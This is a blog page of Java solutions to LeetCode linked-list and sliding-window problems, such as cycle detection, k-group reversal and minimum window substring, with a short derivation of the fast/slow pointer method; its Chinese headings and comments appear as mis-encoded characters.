<h3 id="142-ç¯å½¢é“¾è¡¨-II-x2F"><a href="#142-ç¯å½¢é“¾è¡¨-II-x2F" class="headerlink" title="142. ç¯å½¢é“¾è¡¨ II&#x2F;"></a><a href="https://leetcode-cn.com/problems/linked-list-cycle-ii/">142. ç¯å½¢é“¾è¡¨ II</a>&#x2F;</h3><h4 id="æ–¹æ³•ä¸€-å¿«æ…¢æŒ‡é’ˆ"><a href="#æ–¹æ³•ä¸€-å¿«æ…¢æŒ‡é’ˆ" class="headerlink" title="æ–¹æ³•ä¸€:å¿«æ…¢æŒ‡é’ˆ"></a>æ–¹æ³•ä¸€:å¿«æ…¢æŒ‡é’ˆ</h4><p><img src="/%E7%AE%97%E6%B3%95.assets/2036dfe7e991f00dfb788a9b84a17bb6fac337e81c09bdf57e683d028a6952bc-%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png" alt="æœªå‘½åæ–‡ä»¶.png"></p>
<p>ç›¸é‡æ—¶ï¼š</p>
<ul>
<li>slowèµ°è¿‡çš„è·¯ç¨‹ï¼šx + y + n(y+z), nä»£è¡¨slowç»•äº†nåœˆ</li>
<li>fastèµ°è¿‡çš„è·¯ç¨‹ï¼šx + y + m(y+z)ï¼Œmä»£è¡¨fasté¥¶äº†måœˆ</li>
<li>m &gt; n</li>
</ul>
<p>å› ä¸ºfasté€Ÿåº¦æ˜¯slowä¸¤å€ï¼š</p>
<ul>
<li>2(x + y + n(y + z)) &#x3D; x + y + m(y + z)</li>
<li>x + y &#x3D; (m - 2n)(y + z)</li>
<li>x &#x3D; (m - 2n)(y + z) - y</li>
<li>y + zå°±æ˜¯1åœˆï¼Œå‡è®¾ o &#x3D; m-2nï¼Œoæ˜¯ä¸€ä¸ªæ­£æ•´æ•°ï¼Œé‚£ä¹ˆ x &#x3D; o(y + z) -y</li>
<li>å¦‚æœo &#x3D; 1ï¼Œé‚£ä¹ˆ x &#x3D; zï¼Œå’Œç­”ä¸»å‡è®¾çš„æƒ…å†µä¸€æ ·</li>
<li>å¦‚æœo &gt; 1ï¼Œé‚£ä¹ˆ x &#x3D; (o-1)(y+z) + y + z - y, x &#x3D; (o-1)(y+z) + zï¼Œå³xçš„é•¿åº¦ä¸ºo-1åœˆåŠ ä¸Šz</li>
</ul>
<p>æ‰€ä»¥ï¼Œä»ç¬¬ä¸€é˜¶æ®µè·å¾—çš„ç›¸é‡ç‚¹ï¼Œèµ°è¿‡xè·ç¦»æœºä¼šåˆ°è¾¾ç¯çš„èµ·ç‚¹ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">detectCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span> (fast != <span class="literal">null</span> &amp;&amp; fast.next != <span class="literal">null</span>) &#123;</span><br><span class="line">            </span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">            <span class="keyword">if</span> (slow == fast) &#123;</span><br><span class="line">                fast = head;</span><br><span class="line">                <span class="keyword">while</span> (slow != fast) &#123;</span><br><span class="line">                    slow = slow.next;</span><br><span class="line">                    fast = fast.next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> slow;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="25-K-ä¸ªä¸€ç»„ç¿»è½¬é“¾è¡¨-x2F"><a href="#25-K-ä¸ªä¸€ç»„ç¿»è½¬é“¾è¡¨-x2F" class="headerlink" title="25. K ä¸ªä¸€ç»„ç¿»è½¬é“¾è¡¨&#x2F;"></a><a href="https://leetcode-cn.com/problems/reverse-nodes-in-k-group/">25. K ä¸ªä¸€ç»„ç¿»è½¬é“¾è¡¨</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å¤´æ’æ³•åè½¬é“¾è¡¨</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseKGroup</span><span class="params">(ListNode head, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span> || k &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span>) &#123;</span><br><span class="line">            len++;</span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummy.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pre</span> <span class="operator">=</span> dummy;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len / k; i++) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; k; j++) &#123;</span><br><span class="line">                tmp = cur.next;</span><br><span class="line">                cur.next = tmp.next;</span><br><span class="line">                tmp.next = pre.next;</span><br><span class="line">                pre.next = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            pre = cur;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="143-é‡æ’é“¾è¡¨"><a href="#143-é‡æ’é“¾è¡¨" class="headerlink" title="143. é‡æ’é“¾è¡¨"></a><a href="https://leetcode-cn.com/problems/reorder-list">143. é‡æ’é“¾è¡¨</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reorderList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span>) &#123;</span><br><span class="line">            size++;</span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (size &lt; <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> size / <span class="number">2</span>;</span><br><span class="line">        p = head;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mid; i++) &#123;</span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> p.next;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> (cur.next != <span class="literal">null</span>) &#123;</span><br><span class="line">            tmp = cur.next;</span><br><span class="line">            cur.next = tmp.next;</span><br><span class="line">            tmp.next = p.next;</span><br><span class="line">            p.next = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">q</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span> (p.next != <span class="literal">null</span>) &#123;</span><br><span class="line">            tmp = p.next;</span><br><span class="line">            p.next = tmp.next;</span><br><span class="line">            tmp.next = q.next;</span><br><span class="line">            q.next = tmp;</span><br><span class="line">            q = tmp.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="92-åè½¬é“¾è¡¨-II"><a href="#92-åè½¬é“¾è¡¨-II" class="headerlink" title="92. åè½¬é“¾è¡¨ II"></a><a href="https://leetcode-cn.com/problems/reverse-linked-list-ii">92. åè½¬é“¾è¡¨ II</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseBetween</span><span class="params">(ListNode head, <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span> || left &gt; right) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        dummy.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pre</span> <span class="operator">=</span> dummy;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; left - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            pre = pre.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> pre.next;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; right - left; i++) &#123;</span><br><span class="line">            tmp = cur.next;</span><br><span class="line">            cur.next = tmp.next;</span><br><span class="line">            tmp.next = pre.next;</span><br><span class="line">            pre.next = tmp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="è¡¥å……é¢˜1-æ’åºå¥‡å‡å¶é™é“¾è¡¨"><a href="#è¡¥å……é¢˜1-æ’åºå¥‡å‡å¶é™é“¾è¡¨" class="headerlink" title="è¡¥å……é¢˜1. æ’åºå¥‡å‡å¶é™é“¾è¡¨"></a><a href="https://mp.weixin.qq.com/s/377FfqvpY8NwMInhpoDgsw">è¡¥å……é¢˜1. æ’åºå¥‡å‡å¶é™é“¾è¡¨</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">sort</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// odd</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="comment">// even</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">q</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        dummy.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tail</span> <span class="operator">=</span> dummy;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span> &amp;&amp; p.next != <span class="literal">null</span>) &#123;</span><br><span class="line">            tmp = p.next;</span><br><span class="line">            p.next = tmp.next;</span><br><span class="line">            p = p.next;</span><br><span class="line"></span><br><span class="line">            tmp.next = dummy.next;</span><br><span class="line">            dummy.next = tmp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        q = dummy.next;</span><br><span class="line">        p = head;</span><br><span class="line">        dummy.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span> &amp;&amp; q != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p.val &lt;= q.val) &#123;</span><br><span class="line">                tail.next = p;</span><br><span class="line">                tail = tail.next;</span><br><span class="line">                p = p.next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                tail.next = q;</span><br><span class="line">                tail = tail.next;</span><br><span class="line">                q = q.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (p != <span class="literal">null</span>) &#123;</span><br><span class="line">            tail.next = p;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (q != <span class="literal">null</span>) &#123;</span><br><span class="line">            tail.next = q;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‰‘æŒ‡-Offer-22-é“¾è¡¨ä¸­å€’æ•°ç¬¬Kä¸ªèŠ‚ç‚¹"><a href="#å‰‘æŒ‡-Offer-22-é“¾è¡¨ä¸­å€’æ•°ç¬¬Kä¸ªèŠ‚ç‚¹" class="headerlink" title="å‰‘æŒ‡ Offer 22. é“¾è¡¨ä¸­å€’æ•°ç¬¬Kä¸ªèŠ‚ç‚¹"></a><a href="https://leetcode-cn.com/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof">å‰‘æŒ‡ Offer 22. é“¾è¡¨ä¸­å€’æ•°ç¬¬Kä¸ªèŠ‚ç‚¹</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">getKthFromEnd</span><span class="params">(ListNode head, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span> || k &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span>) &#123;</span><br><span class="line">            count++;</span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (k &gt; count) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummy.next = head;</span><br><span class="line"></span><br><span class="line">        p = dummy;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> count - k + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            p = p.next;</span><br><span class="line">            num--;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="234-å›æ–‡é“¾è¡¨"><a href="#234-å›æ–‡é“¾è¡¨" class="headerlink" title="234. å›æ–‡é“¾è¡¨"></a><a href="https://leetcode-cn.com/problems/palindrome-linked-list">234. å›æ–‡é“¾è¡¨</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å…ˆåè½¬å†éå†æ¯”è¾ƒ</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isPalindrome</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span> (fast.next != <span class="literal">null</span> &amp;&amp; fast.next.next != <span class="literal">null</span>) &#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> slow.next;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> (p.next != <span class="literal">null</span>) &#123;</span><br><span class="line">            temp = p.next;</span><br><span class="line">            p.next = temp.next;</span><br><span class="line">            temp.next = slow.next;</span><br><span class="line">            slow.next = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        p = slow.next;</span><br><span class="line">        slow.next = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (head != <span class="literal">null</span> &amp;&amp; p != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (head.val != p.val) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            head = head.next;</span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="160-ç›¸äº¤é“¾è¡¨"><a href="#160-ç›¸äº¤é“¾è¡¨" class="headerlink" title="160. ç›¸äº¤é“¾è¡¨"></a><a href="https://leetcode-cn.com/problems/intersection-of-two-linked-lists/">160. ç›¸äº¤é“¾è¡¨</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (headA == <span class="literal">null</span> || headB == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sizeA</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sizeB</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> headA, q;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span>) &#123;</span><br><span class="line">            sizeA++;</span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line">        p = headB;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span>) &#123;</span><br><span class="line">            sizeB++;</span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line">        p = headA;</span><br><span class="line">        q = headB;</span><br><span class="line">        <span class="keyword">if</span> (sizeA &gt; sizeB) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> sizeA - sizeB;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">                p = p.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> sizeB - sizeA;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">                q = q.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span> &amp;&amp; q != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p == q) &#123;</span><br><span class="line">                <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">            p = p.next;</span><br><span class="line">            q = q.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æ»‘åŠ¨çª—å£"><a href="#æ»‘åŠ¨çª—å£" class="headerlink" title="æ»‘åŠ¨çª—å£"></a>æ»‘åŠ¨çª—å£</h2><h3 id="3-æ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²-x2F-x2F-x2F-x2F"><a href="#3-æ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²-x2F-x2F-x2F-x2F" class="headerlink" title="3. æ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²&#x2F;&#x2F;&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/longest-substring-without-repeating-characters/">3. æ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²</a>&#x2F;&#x2F;&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ»‘åŠ¨çª—å£</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLongestSubstring</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span>[] sc = s.toCharArray();</span><br><span class="line">        HashMap&lt;Character, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; sc.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(sc[i])) &#123;</span><br><span class="line">                <span class="comment">// abbaè¿™ä¸ªé€šè¿‡ä¸äº†</span></span><br><span class="line">                <span class="comment">// left = map.get(charArray[i]); </span></span><br><span class="line">                left = Math.max(left, map.get(sc[i]) + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            map.put(sc[i], i);</span><br><span class="line">            max = Math.max(max, i - left + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="76-æœ€å°è¦†ç›–å­ä¸²"><a href="#76-æœ€å°è¦†ç›–å­ä¸²" class="headerlink" title="76. æœ€å°è¦†ç›–å­ä¸²"></a><a href="https://leetcode-cn.com/problems/minimum-window-substring/">76. æœ€å°è¦†ç›–å­ä¸²</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ»‘åŠ¨çª—å£</span></span><br><span class="line"><span class="comment">//ä¸€ä¸ªç”¨äºã€Œå»¶ä¼¸ã€ç°æœ‰çª—å£çš„r æŒ‡é’ˆï¼Œå’Œä¸€ä¸ªç”¨äºã€Œæ”¶ç¼©ã€çª—å£çš„l æŒ‡é’ˆã€‚åœ¨ä»»æ„æ—¶åˆ»ï¼Œåªæœ‰ä¸€ä¸ªæŒ‡é’ˆè¿åŠ¨ï¼Œè€Œå¦ä¸€</span></span><br><span class="line"><span class="comment">//ä¸ªä¿æŒé™æ­¢ã€‚æˆ‘ä»¬åœ¨ s ä¸Šæ»‘åŠ¨çª—å£ï¼Œé€šè¿‡ç§»åŠ¨ r æŒ‡é’ˆä¸æ–­æ‰©å¼ çª—å£ã€‚å½“çª—å£åŒ…å« t å…¨éƒ¨æ‰€éœ€çš„å­—ç¬¦åï¼Œå¦‚æœèƒ½æ”¶</span></span><br><span class="line"><span class="comment">//ç¼©ï¼Œæˆ‘ä»¬å°±æ”¶ç¼©çª—å£ç›´åˆ°å¾—åˆ°æœ€å°çª—å£ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">minWindow</span><span class="params">(String s, String t)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="literal">null</span> || s == <span class="string">&quot;&quot;</span> || t == <span class="literal">null</span> || t == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">char</span>[] sc = s.toCharArray();</span><br><span class="line">        <span class="type">char</span>[] tc = t.toCharArray();</span><br><span class="line">        <span class="type">int</span>[] need = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">128</span>];</span><br><span class="line">        <span class="type">int</span>[] have = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">128</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tc.length; i++) &#123;</span><br><span class="line">            need[tc[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>, r = <span class="number">0</span>, count = <span class="number">0</span>, min = sc.length + <span class="number">1</span>, start = l;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (r &lt; sc.length) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> sc[r];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (need[c] == <span class="number">0</span>) &#123;</span><br><span class="line">                r++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (have[c] &lt; need[c]) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">            have[c]++;</span><br><span class="line">            r++;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (count == tc.length) &#123;</span><br><span class="line">                c = sc[l];</span><br><span class="line">                <span class="keyword">if</span> (need[c] == <span class="number">0</span>) &#123;</span><br><span class="line">                    l++;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (r - l &lt; min) &#123;</span><br><span class="line">                    min = r - l;</span><br><span class="line">                    start = l;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (have[c] == need[c]) &#123;</span><br><span class="line">                    count--;</span><br><span class="line">                &#125;</span><br><span class="line">                have[c]--;</span><br><span class="line">                l++;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (min == s.length() + <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s.substring(start, start + min);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

